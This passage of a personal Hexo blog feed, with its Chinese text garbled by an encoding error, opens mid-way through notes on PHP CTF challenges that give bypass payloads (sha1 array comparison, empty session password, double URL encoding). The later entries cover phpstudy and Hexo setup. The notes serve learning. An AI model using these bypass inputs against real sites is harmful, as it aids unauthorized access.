class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯-5"><a href="#è§£é¢˜æ€è·¯-5" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><p>è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š<code>($_GET[&#39;name&#39;] ï¼== $_GET[&#39;password&#39;]</code>å’Œ</p><p><code>sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;])</code>ã€‚</p><p>å°±æ˜¯è¦è®©è¾“å…¥çš„ä¸¤ä¸ªå˜é‡ä¸ç›¸ç­‰ä½†æ˜¯sha1åŠ å¯†åç›¸ç­‰ã€‚</p><p>ä¸åŒçš„å­—ç¬¦ä¸²ç»è¿‡sha1åŠ å¯†åä¸€å®šä¸åŒï¼Œä½†æ˜¯sha1ä¸èƒ½åŠ å¯†æ•°ç»„ï¼Œä¼šæŠ¥é”™è¿”å›nullï¼Œå¦‚æœè®©ä¸¤ä¸ªå˜é‡åŒæ—¶è¿”å›nullå°±ä¼šç›¸ç­‰è¾£ã€‚</p><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?name[]=1&amp;password[]=2</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_20-57-05.png"></p><h3 id="07-session-éªŒè¯ç»•è¿‡"><a href="#07-session-éªŒè¯ç»•è¿‡" class="headerlink" title="07 session éªŒè¯ç»•è¿‡"></a>07 session éªŒè¯ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#é¢˜ç›®æºä»£ç </span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Modifierç»ˆå°†å¦ææ³°æ¥&quot;</span>;<br><br><span class="hljs-title function_ invoke__">session_start</span>(); <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] == <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">die</span> (<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;&lt;p&gt;Wrong guess.&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">mt_srand</span>((<span class="hljs-title function_ invoke__">microtime</span>() ^ <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>)) % <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>) + <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>è¦æ»¡è¶³æ¡ä»¶<code>$_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;]</code></p><blockquote><p>$_SESSION()å­˜å‚¨ä¼šè¯ä¿¡æ¯</p></blockquote><p>è¿™é‡Œsessionä¸­çš„passwordéœ€è¦æˆ‘ä»¬è‡ªå·±ä¼ å…¥ï¼Œå¦‚æœä¸ä¼ å°±æ˜¯nullï¼ŒåŒæ—¶passwordä¹Ÿä¼ ç©ºï¼ŒäºŒè€…å°±ç›¸ç­‰å•¦</p><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?password=</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_21-40-38.png"></p><h3 id="08-urldecode-äºŒæ¬¡ç¼–ç ç»•è¿‡"><a href="#08-urldecode-äºŒæ¬¡ç¼–ç ç»•è¿‡" class="headerlink" title="08 urldecode äºŒæ¬¡ç¼–ç ç»•è¿‡"></a>08 urldecode äºŒæ¬¡ç¼–ç ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">#é¢˜ç›®æºä»£ç </span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] == <span class="hljs-string">&quot;hackerDJ&quot;</span>)<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h5><p>éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š<code>eregi(&quot;hackerDJ&quot;,$_GET[&#39;id&#39;])</code>ä¸ºfalseï¼›ç»è¿‡urldecodeç¼–ç åæ»¡è¶³<code>$_GET[&#39;id&#39;] == &quot;hackerDJ&quot;</code></p><p>ä¹Ÿå°±æ˜¯è¯´ä¼ å…¥å€¼ä¸èƒ½æ˜¯hackerDJï¼Œä½†æ˜¯ä¼ å…¥å€¼<strong>ç»è¿‡urldecodeè§£ç å</strong>è¦å’ŒhackerDJç›¸ç­‰ã€‚</p><p>æ‰€ä»¥ä¼ å…¥æ—¶è¦å°†hackerDJçš„urlç¼–ç å†ç¼–ç ä¸€æ¬¡ã€‚</p><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?id=%2568%2561%2563%256b%2544%254a</code></p><hr><p>æ€»è§‰å¾—å°‘äº†ç‚¹ä»€ä¹ˆåŸæ¥æ˜¯æŠŠè¿™ä¸ªç¬”è®°å¿˜è®°å–½</p><p>å‘ä¸Šæ¥é˜²æ­¢è‡ªå·±æ‰‹è´±åˆ æ‰ğŸ¦­</p><p>æŠŠä¸‡å¸ˆå‚…çš„åŸåšæ”¾è¿™é‡Œ</p><p><a href="https://drun1baby.github.io/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">PHP å…¥é—¨åŸºç¡€æ¼æ´ | èŠœé£ (drun1baby.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨æµè§ˆå™¨æ‰“å¼€æœ¬åœ°PHPæ–‡ä»¶</title>
    <link href="/2023/02/28/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/"/>
    <url>/2023/02/28/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>éšæœºæ‰è½åºŸç‰©Modç ”ç©¶phpçš„ç¬”è®°ğŸ˜®</p><span id="more"></span><h2 id="01-é…ç½®PHPè¿è¡Œç¯å¢ƒ"><a href="#01-é…ç½®PHPè¿è¡Œç¯å¢ƒ" class="headerlink" title="01 é…ç½®PHPè¿è¡Œç¯å¢ƒ"></a>01 é…ç½®PHPè¿è¡Œç¯å¢ƒ</h2><p>ä¸‡èƒ½çš„äº’è”ç½‘æ•™æˆ‘ä¸‹è½½Apacheï¼ŒPHPå’ŒMySQLã€‚å¥½å¤šå¥½éº»çƒ¦ã€‚æˆ‘é€‰æ‹©ç›´æ¥ç”¨é›†æˆç¯å¢ƒã€‚</p><p><a href="https://www.xp.cn/">phpstudyå®˜ç½‘</a></p><p>ç›´æ¥å»å®˜ç½‘ä¸‹è½½ï¼Œä¼šæœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹ä»¥åæ‰“å¼€ç¬¬ä¸€ä¸ªexeæ–‡ä»¶å®‰è£…å°±å¥½ã€‚</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-04-46.png"></p><p>æ³¨æ„ï¼šå‹ç¼©åŒ…ä¿å­˜çš„è·¯å¾„ä¸èƒ½æœ‰ä¸­æ–‡å’Œç©ºæ ¼</p><p>åœ¨å®‰è£…æ—¶çš„è‡ªå®šä¹‰é€‰é¡¹ä¸­å¯ä»¥ä¿®æ”¹å®‰è£…åŒ…çš„ä½ç½®ï¼Œæˆ‘çš„æ˜¯é»˜è®¤åœ¨Dç›˜æ ¹ç›®å½•ï¼ŒæŠŠå®ƒæ”¹åˆ°æ”¾å‹ç¼©åŒ…çš„æ–‡ä»¶å¤¹é‡Œäº†ã€‚</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-06-25.png"></p><p>æ ¹æ®æœ¬äººå°è¯•ï¼Œåœ¨æµè§ˆå™¨çœ‹PHPæ–‡ä»¶åªéœ€è¦æŠŠApacheæ‰“å¼€å°±è¡Œã€‚</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-32-00.png"></p><h2 id="02-æŠŠæ–‡ä»¶ä¸¢è¿›ç½‘ç«™æ ¹ç›®å½•"><a href="#02-æŠŠæ–‡ä»¶ä¸¢è¿›ç½‘ç«™æ ¹ç›®å½•" class="headerlink" title="02 æŠŠæ–‡ä»¶ä¸¢è¿›ç½‘ç«™æ ¹ç›®å½•"></a>02 æŠŠæ–‡ä»¶ä¸¢è¿›ç½‘ç«™æ ¹ç›®å½•</h2><p>åœ¨ä¸Šè¿°å®‰è£…æ­¥éª¤æ­¥éª¤ä¸­ï¼Œä¼šç”Ÿæˆ<strong>phpstudy_pro</strong>æ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶å¤¹ä¸­åˆæœ‰<strong>WWW</strong>æ–‡ä»¶å¤¹ã€‚</p><p>ç½‘ç«™æ ¹ç›®å½•å°±æ˜¯wwwæ–‡ä»¶ä¸‹ï¼Œå¿…é¡»å°†æ–‡ä»¶æ”¾ç½®æ­¤ä½ç½®æ‰ç®—æœ‰æ•ˆï¼Œå¦åˆ™æ— æ³•è¿è¡Œphpæ–‡ä»¶ã€‚</p><h2 id="03-è¿è¡ŒPHPæ–‡ä»¶"><a href="#03-è¿è¡ŒPHPæ–‡ä»¶" class="headerlink" title="03 è¿è¡ŒPHPæ–‡ä»¶"></a>03 è¿è¡ŒPHPæ–‡ä»¶</h2><p>æ‰“å¼€æµè§ˆå™¨ï¼Œåœ¨å¯¼èˆªæ è¾“å…¥<code>localhost/[æ–‡ä»¶å]</code>å°±å¯ä»¥å•¦</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-42-05.png"></p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-41-36.png"></p><h2 id="04-åœŸç‹—å‘è¨€"><a href="#04-åœŸç‹—å‘è¨€" class="headerlink" title="04 åœŸç‹—å‘è¨€"></a>04 åœŸç‹—å‘è¨€</h2><p>å› ä¸ºæœ‰ä¸€ä¸ªæ–‡ä»¶å†™é”™äº†ï¼Œåœ¨æµè§ˆå™¨æ‰“å¼€çš„æ—¶å€™æŠ¥é”™äº†ã€‚</p><p>å®ƒå±…ç„¶è¿˜å¯ä»¥æŠ¥é”™ï¼</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_21-09-18.png"></p><p>å¤ªé«˜çº§äº†</p><hr><p>é›†æˆç¯å¢ƒyydsğŸ¥³</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>PHP</tag>
      
      <tag>phpstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexoä½¿ç”¨è®°å½•</title>
    <link href="/2023/02/23/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/02/23/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>é‡åˆ°çš„ä¸€äº›å¥‡æ€ªé—®é¢˜å’Œä¿®æ”¹ä¸»é¢˜é¡µé¢çš„ç»éªŒâœ‚ï¸</p><span id="more"></span><h2 id="å¥‡æ€ªé—®é¢˜"><a href="#å¥‡æ€ªé—®é¢˜" class="headerlink" title="å¥‡æ€ªé—®é¢˜"></a>å¥‡æ€ªé—®é¢˜</h2><h4 id="æ’å…¥å›¾ç‰‡å‘"><a href="#æ’å…¥å›¾ç‰‡å‘" class="headerlink" title="æ’å…¥å›¾ç‰‡å‘"></a>æ’å…¥å›¾ç‰‡å‘</h4><p>åœ¨æœ€å¼€å§‹å†™åšå®¢çš„æ—¶å€™ï¼ŒåƒæŒ‘ä¸‡é€‰æ‰¾äº†å¼ ç¾å›¾å‡†å¤‡å½“å°é¢ï¼Œå¤åˆ¶æ–‡ä»¶åœ°å€æ’å…¥ã€‚<code>hexo g</code> <code>hexo s</code>æœ¬åœ°é¢„è§ˆä¸€åˆ‡æ­£å¸¸ï¼Œ<code>hexo d</code>ä¸€æ¡é¾™æ¨ä¸Šå»å‘ç°å›¾ç‰‡è¢«å’Œè°æ‰äº†ï¼ˆ<del>ä¸æ˜¯</del>ï¼‰</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-13-07.png"></p><p>å‰å»ä¸‡èƒ½çš„äº’è”ç½‘å¯»æ‰¾äº†ä¸€ä¸‹ç­”æ¡ˆï¼Œæœ‰çš„è¯´å†™æ–‡ç« çš„æ—¶å€™è¦å»ºä¸€ä¸ªåŒåæ–‡ä»¶å¤¹æ”¾å›¾ç‰‡ï¼Œæœ‰çš„è¯´è¦å®‰è£…æ’ä»¶ã€‚</p><p>æˆ‘å½“ç„¶æ˜¯é€‰æ‹©å»ºæ–‡ä»¶å¤¹è¿™ä¸ªæ›´ç®€å•çš„æ“ä½œã€‚</p><p>åœ¨é…ç½®æ–‡ä»¶_config.ymlé‡Œæ‰¾åˆ°<strong>post_asset_folder</strong>ï¼ŒæŠŠfalseæ”¹ä¸ºtrueï¼Œå†æ¬¡<code>hexo new</code>å°±å»ºå¥½.mdæ–‡ä»¶å’Œæ–‡ä»¶å¤¹äº†ã€‚ç»è¿‡æœ¬äººä¸€é¡¿Ctrl+Cå’ŒCtrl+Vçš„æ“ä½œæŠŠåŸæ–‡ä»¶å’Œå›¾ç‰‡ç§»åˆ°æ–°çš„æ–‡ä»¶ï¼Œå……æ»¡ä¿¡å¿ƒåœ°å†æ¬¡<code>hexo g</code> <code>hexo d</code></p><p>è¿˜æ˜¯ä¸æ˜¾ç¤ºå›¾ç‰‡</p><p>å¥½çš„ğŸ˜¢<del>ä¸€å®šæ˜¯å›¾ç‰‡å®ƒçœŸçš„è¿ç¦äº†</del></p><p>å½“æˆ‘å†æ¬¡åœ¨äº’è”ç½‘æœç´¢æ—¶ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªåç‚¹</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-22-06.png"></p><p>è¿™ä¸ªmarkdownè¯­æ³•é‡Œçš„å›¾ç‰‡æ’å…¥æ˜¯<code>/</code>ï¼Œä½†æ˜¯æˆ‘å¤åˆ¶çš„å›¾ç‰‡è·¯å¾„ç”¨çš„æ˜¯<code>\</code>ï¼</p><p>æˆ‘å°è¯•ç€ä¿®æ”¹ä¹‹åå†æ¬¡<code>hexo d</code></p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-30-47.png"></p><p>å°±è¿™ä¹ˆæˆåŠŸäº†ğŸ¤¨</p><h4 id="Spawn-failedå‘"><a href="#Spawn-failedå‘" class="headerlink" title="Spawn failedå‘"></a>Spawn failedå‘</h4><p>ç¾æ»‹æ»‹å‘äº†ä¸€ç¯‡ç¬”è®°ä¸Šæ¥ï¼Œå‘ç°æ ¼å¼æœ‰bugï¼ŒæŠ“ç´§æ—¶é—´ä¿®æ”¹ã€‚ä¿®æ”¹ä¹‹åå†æ¬¡ä¸æ»‘ä¸€æ¡é¾™ä¸Šä¼ Â·Â·Â·Â·Â·Â·</p><p>æ²¡ä¸æ»‘æˆåŠŸ</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-07-25.png"></p><p>æŠ¥é”™å–½ğŸ¥³<del>æˆ‘é¢å®¹å¹³å’Œæ ¹æœ¬å°±æ²¡æœ‰åœ¨ç”Ÿæ°”</del></p><p>ç¿»è¯‘äº†ä¸€ä¸‹æ˜¯â€œè¯·ç¡®ä¿æ‚¨æœ‰æ­£ç¡®çš„è®¿é—®æƒé™â€ï¼Œä¸ä¼šæã€‚æŠŠç›®å…‰æŠ•å‘ä¸‡èƒ½çš„äº’è”ç½‘ï¼Œç½‘ä¸Šè¯´æ˜¯è¿æ¥çš„é—®é¢˜ã€‚</p><p>çœ‹åˆ°ä¸€æ¡è¯´å› ä¸ºgit è¿›è¡Œ<code>push</code>æˆ–è€…<code>hexo d</code>çš„æ—¶å€™æ”¹å˜äº†ä¸€äº›.deploy_gitæ–‡ä»¶ä¸‹çš„å†…å®¹ï¼Œåªéœ€è¦é‡æ–°downä¸€ä¸‹å°±è¡Œã€‚</p><p>äºæ˜¯åˆ é™¤.deploy_gitæ–‡ä»¶å¤¹ï¼Œå†æ¬¡<code>hexo c</code> <code>hexo g</code> <code>hexo d</code>ã€‚å‡ºç°äº†ä¸€ä¸ªæ–°çš„.deploy_gitæ–‡ä»¶ï¼</p><p>ä¾æ—§æŠ¥é”™ğŸ¥€</p><p>åˆç»§ç»­å†²æµªæ‰¾è§£å†³æ–¹æ¡ˆï¼Œåˆçœ‹åˆ°ä¸€æ¡è¯´è¦åœ¨_config.ymlæ–‡ä»¶é‡ŒæŠŠ<strong>repo</strong>åœ°å€æ”¹æˆgitåœ°å€ã€‚æˆ‘æ—©å°±æ”¹è¿‡äº†ä½†æ˜¯æˆ‘å‘ç°è¿™ä¸ªäººçš„<strong>deploy</strong>æ¡ç›®æ¯”æˆ‘å¤šä¸€ä¸ª<strong>branch</strong>ã€‚</p><p>ç§‰æ‰¿ç€ä¸é”™è¿‡ä»»ä½•ä¸€ä¸ªç»†èŠ‚çš„æ€åº¦æˆ‘åœ¨è‡ªå·±çš„æ–‡ä»¶é‡Œä¹ŸåŠ ä¸Šäº†è¿™æ¡å¹¶è®¤çœŸå¡«å…¥masterã€‚</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_21-11-55.png"></p><p>ä¿å­˜ï¼Œ<code>hexo d</code>ï¼ŒåŠ è½½æˆåŠŸï¼Ÿï¼Ÿï¼Ÿ</p><p>äº‹æƒ…æ€ä¼šå¦‚æ­¤ç®€å•ï¼Œæˆ‘è§£å†³å®Œé—®é¢˜æ‰æƒ³èµ·è¦è®°å½•ä¸€ä¸‹è¸©å‘æ–°é²œäº‹ï¼Œäºæ˜¯ä¹å†æ¬¡<code>hexo d</code>æƒ³çœ‹çœ‹æ•ˆæœã€‚</p><p>åˆæŠ¥é”™äº†ğŸ˜®æˆ‘æ‰åå…«çœ¼ç¥è¿˜æŒºå¥½ä½¿çš„éš¾é“åˆšæ‰æ˜¯çœ¼èŠ±äº†å—ï¼Ÿ</p><p>æ¢äº†ä¸ªæœç´¢å¼•æ“ç»§ç»­æœï¼Œçœ‹åˆ°ä¸€ä¸ªcsdnä¸Šçš„è®¨è®ºï¼Œéƒ½è®©ä¿®æ”¹repoåœ°å€ã€‚æˆ‘ä¸ä¿¡é‚ªç»§ç»­å¾€ä¸‹æ‹‰ï¼Œçœ‹åˆ°ä¸€æ¡æ ‡ç­¾</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_21-17-43.png"></p><p>æˆ‘è„‘æµ·ä¸­çš„å°ç¯æ³¡çªç„¶å°±äº®äº†ï¼Œæˆ‘å›åˆ°æµè§ˆå™¨çœ‹è‡ªå·±çš„åšå®¢ï¼Œæ ¼å¼å·²ç»ä¿®æ”¹è¿‡æ¥äº†ï¼Œä¹Ÿå°±æ˜¯è¯´é‚£æ¬¡çœ¼èŠ±æ˜¯çœŸçš„æ¨ä¸Šå»äº†ã€‚</p><p>Githubä½ ä¸è¦å¤ªè’è°¬ğŸ˜…</p><h2 id="ä¿®æ”¹ä¸»é¢˜é…ç½®"><a href="#ä¿®æ”¹ä¸»é¢˜é…ç½®" class="headerlink" title="ä¿®æ”¹ä¸»é¢˜é…ç½®"></a>ä¿®æ”¹ä¸»é¢˜é…ç½®</h2><h4 id="é¡µè„šç‰ˆæƒå£°æ˜"><a href="#é¡µè„šç‰ˆæƒå£°æ˜" class="headerlink" title="é¡µè„šç‰ˆæƒå£°æ˜"></a>é¡µè„šç‰ˆæƒå£°æ˜</h4><p>åŸæœ¬çš„ä¸»é¢˜é¡µè„šï¼Œå§ä¸å–œæ¬¢ï¼Œè¿™ä¸ªçˆ±å¿ƒå¤ªä¸ç¬¦åˆå§Bkingçš„äººè®¾äº†ã€‚</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-35-37.png"></p><p>æˆ‘æƒ³è¦æœ‰ä¸ªäººç‰ˆæƒå£°æ˜çš„é¡µè„šï¼Œç»è¿‡å­¦ä¹ æŒæ¡ç‰ˆæƒå£°æ˜æ ¼å¼åæˆ‘å¼€å§‹å‡†å¤‡å¤§æ”¹ç‰¹æ”¹ã€‚</p><p>å‡­å€Ÿæˆ‘åªæœ‰ä¸€ç‚¹çŸ¥è¯†çš„è„‘å£³å‘Šè¯‰æˆ‘è¿™ç§é¡µé¢è¦ç”¨HTMLæ¥å†™ã€‚å¥ˆä½•è‚šå­é‡Œå¢¨æ°´å¤ªå°‘ï¼Œåªæœ‰å›¾çº¸æ²¡æœ‰å·¥å…·æ²¡æ³•ç›–æˆ¿å­<del>ï¼ˆå°±æ˜¯ä¸ä¼šå†™ä»£ç ï¼‰</del></p><p>ç®—äº†ï¼Œè¿˜æ˜¯æ±‚åŠ©ä¸€ä¸‹ä¸‡èƒ½äº’è”ç½‘å§</p><p>æœåˆ°çš„å…¨æ˜¯æ€ä¹ˆç»™é¡µè„šæ·»åŠ è¿è¡Œæ—¶é—´ğŸ¥²å°±æ˜¯æ²¡äººæ•™ä½ æ€ä¹ˆå†™ç‰ˆæƒå£°æ˜ã€‚æ¢ä¸ªæ€è·¯ï¼Œæˆ‘å»æŠ“äº†ä¸€ä¸ªåˆ«äººç½‘é¡µçš„åŒ…ç›´æ¥å·ç°æˆçš„ã€‚</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-52-54.png"></p><p>ä»£ç getï¼</p><p>ç»è¿‡æˆ‘ä¸€ç•ªåŠªåŠ›ï¼Œåœ¨ä¸»é¢˜çš„.ymlæ–‡ä»¶é‡Œæ‰¾åˆ°äº†<strong>footer</strong>éƒ¨åˆ†ï¼Œéå¸¸æ„Ÿè°¢ä¸»é¢˜ä½œè€…çš„æ³¨é‡Šå†™å¾—é‚£ä¹ˆè¯¦ç»†ï¼Œå¾ˆè½»æ¾å°±æ‰¾åˆ°äº†HTMLä»£ç åŒºã€‚æŠŠåŸæ¥çš„æ³¨é‡Šæ‰ï¼Œå†åŠ ä¸Šè‡ªå·±copyæ¥çš„ä»£ç ã€‚</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-59-56.png"></p><p>ä¸€æ¡é¾™ä»¥åç¾ç¾å¾—åˆ°è‡ªå·±å–œæ¬¢çš„é¡µè„šğŸ¤ª</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-58-07.png"></p>]]></content>
    
    
    <categories>
      
      <category>è¸©å‘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€èµ·æ¥æ­åšå®¢</title>
    <link href="/2023/01/07/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/"/>
    <url>/2023/01/07/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>åˆ©ç”¨hexo+GitHubæ­å»ºä¸€ä¸ªå±äºè‡ªå·±çš„åšå®¢</p><span id="more"></span><p>åˆåï¼šæˆ‘æ€ä¹ˆä»€ä¹ˆéƒ½ä¸ä¼šä¹‹è¸©å‘è®°å½•ğŸ¥€</p><p>å»ºè®®åœ¨powershellæ‰§è¡Œå‘½ä»¤ï¼Œcmdæœ‰äº›æ­¥éª¤ä¼šæç¤ºæƒé™ä¸å¤Ÿ</p><p>â€è¸©å‘â€œéƒ¨åˆ†éƒ½æ˜¯é‡åˆ°çš„é—®é¢˜å’Œåæ§½çš„ç¢ç¢å¿µï¼Œå¦‚æœåœ¨è¿‡ç¨‹ä¸­æ²¡æœ‰é‡åˆ°é—®é¢˜å°±ä¸ç”¨çœ‹ğŸ¥°</p><h2 id="gitä¸‹è½½"><a href="#gitä¸‹è½½" class="headerlink" title="gitä¸‹è½½"></a>gitä¸‹è½½</h2><p>è¿™é‡Œæš‚æ—¶å…ˆé»˜è®¤æœ‰gitï¼Œå› ä¸ºå½“æ—¶æ­åšå®¢çš„ä¹‹å‰å°±æœ‰ç”¨åˆ°gitäº†ã€‚</p><p>ç­‰æˆ‘æœ‰ç©ºè¡¥ä¸ŠğŸ˜‡</p><h2 id="node-jsä¸‹çš„Hexoå®‰è£…å’Œæ¢æº"><a href="#node-jsä¸‹çš„Hexoå®‰è£…å’Œæ¢æº" class="headerlink" title="node.jsä¸‹çš„Hexoå®‰è£…å’Œæ¢æº"></a>node.jsä¸‹çš„Hexoå®‰è£…å’Œæ¢æº</h2><h4 id="node-jså®‰è£…"><a href="#node-jså®‰è£…" class="headerlink" 